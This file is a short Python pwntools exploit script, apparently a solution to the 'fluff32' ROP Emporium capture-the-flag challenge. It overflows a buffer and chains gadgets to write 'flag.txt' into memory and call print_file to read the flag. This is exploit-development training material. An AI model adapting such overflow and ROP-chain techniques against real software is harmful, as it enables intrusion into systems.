#!/usr/bin/python3
from pwn import process, p32, log

shell = process("./fluff32")

offset = 44
junk = b"A" * offset

string = "flag.txt"

payload  = b""
payload += junk

for i in range(len(string)):
    payload += p32(0x8048527)      # popal; cld; ret;
    payload += p32(0x0) * 5        # padding for pops
    payload += p32(ord(string[i])) # letter
    payload += p32(0x804a018 + i)  # .data
    payload += p32(0x0)            # padding for pop
    payload += p32(0x8048555)      # xchg byte ptr [ecx], dl; ret;

payload += p32(0x80483d0) # print_file()
payload += b"B" * 4       # return addr
payload += p32(0x804a018) # "flag.txt"

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")
